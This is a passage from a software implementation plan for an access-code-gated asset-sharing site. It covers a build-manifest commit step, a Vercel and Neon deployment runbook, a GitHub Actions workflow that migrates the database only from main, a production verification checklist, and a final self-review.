Expected: manifest lists the demo slug with title "Demo". Clean up: `rm -rf assets/<slug> assets/manifest.json`.

- [ ] **Step 8: Commit**

```bash
git add scripts/ package.json .gitignore
git commit -m "feat: build-manifest step with slug/duplicate/external-origin checks"
```

**BEFORE marking Phase 6 complete:** confirm the build FAILS on a human-readable slug and on an external-origin reference (add a throwaway asset, run `build-manifest`, see non-zero exit, remove it). `npm test` green. Update banner + table.

---

## Phase 7 — Deploy pipeline & isolation

**Execution Status:** ⬜ NOT STARTED

> Mostly infra/config + human-in-the-loop Vercel/Neon dashboard steps. Read spec §10, §11.

### Task 7.1: Neon databases + Vercel env vars (human-assisted)

**Files:**
- Create: `docs/deploy/SETUP.md` (runbook)

- [ ] **Step 1: Write the runbook** `docs/deploy/SETUP.md` documenting exactly:
  - Create a Vercel project linked to `github.com/oren-datanation/share-site`; set **production branch = `main`**.
  - Add the Vercel Postgres (Neon) integration. Create a **separate Neon branch** for preview (`preview`) vs `main` (production).
  - Set env vars per environment (spec §10): `DATABASE_URL` (prod → main branch DB; preview → preview branch DB), `SESSION_SECRET`, `ASSET_COOKIE_SECRET` (distinct per env), `ADMIN_PASSWORD_HASH`, `ADMIN_TOTP_SECRET` — generate the last two with `node scripts/admin-setup.mjs <password>`.
  - Note: `VERCEL_ENV` is provided automatically by Vercel; the middleware uses it to gate `/admin`.

- [ ] **Step 2: Commit**

```bash
git add docs/deploy/SETUP.md
git commit -m "docs: deploy setup runbook (Neon branches, per-env secrets)"
```

### Task 7.2: Gated, main-only migration release step

**Files:**
- Create: `.github/workflows/migrate.yml`

- [ ] **Step 1: Implement** `.github/workflows/migrate.yml` (runs migrations only on push to `main`, forward-only — spec §11):

```yaml
name: db-migrate
on:
  push:
    branches: [main]
concurrency:
  group: db-migrate
  cancel-in-progress: false
jobs:
  migrate:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with: { node-version: 24 }
      - run: npm ci
      - run: npm run db:migrate
        env:
          DATABASE_URL: ${{ secrets.PROD_DATABASE_URL }}
```

> Add `PROD_DATABASE_URL` as a GitHub Actions secret (the production/main Neon branch URL). `concurrency` with `cancel-in-progress: false` serializes migrations (advisory-lock equivalent — spec §11).

- [ ] **Step 2: Commit**

```bash
git add .github/workflows/migrate.yml
git commit -m "ci: gated main-only forward-only DB migration workflow"
```

### Task 7.3: Full production verification

- [ ] **Step 1: Merge to `main`, let Vercel deploy, run the real end-to-end flow** on the production URL:
  1. `npm run new-asset -- "Verification"`, commit on `main`, deploy.
  2. In production `/admin/login`: sign in with password + TOTP → reach `/admin`.
  3. Generate a code for the Verification asset; copy the link.
  4. Open the link in a fresh browser → 302 → asset renders. Confirm the URL bar has no `?code=` after redirect.
  5. Revoke the code in `/admin`; reload the asset → generic failure page (instant revoke).
  6. `curl -sI <prod>/a/<slug>` after revoke → failure body; `curl <prod>/robots.txt` → `Disallow: /`.

- [ ] **Step 2: Record results** in the plan's Execution Status (Discoveries if anything deviated).

**BEFORE marking Phase 7 complete:** all six verification substeps in 7.3 pass on the real production URL. Update banner + table + Overall.

---

## Final self-review (run after all phases planned/executed)

- **Spec coverage:** every spec section maps to a phase — §4→P0, §5→P2, §6→P3, §7→P1/P3/P6, §8→P4/P5, §9→P3, §10/§11→P7, §12 order = phase order, §13 tests = per-task, §14 YAGNI respected (no sidecar/iframe/multi-admin work planned).
- **No placeholders:** every code step has real, runnable code — no TBDs, no "double-insert" checkpoints.
- **Type consistency:** `CodeRow`, `CodeRepo`, `AssetClaims`, `RateStore`, `TotpStepStore`, `Manifest` are defined once and reused; `manifest.json` shape `{ [slug]: { title } }` is consistent across Tasks 5.1, 5.2, 6.2.
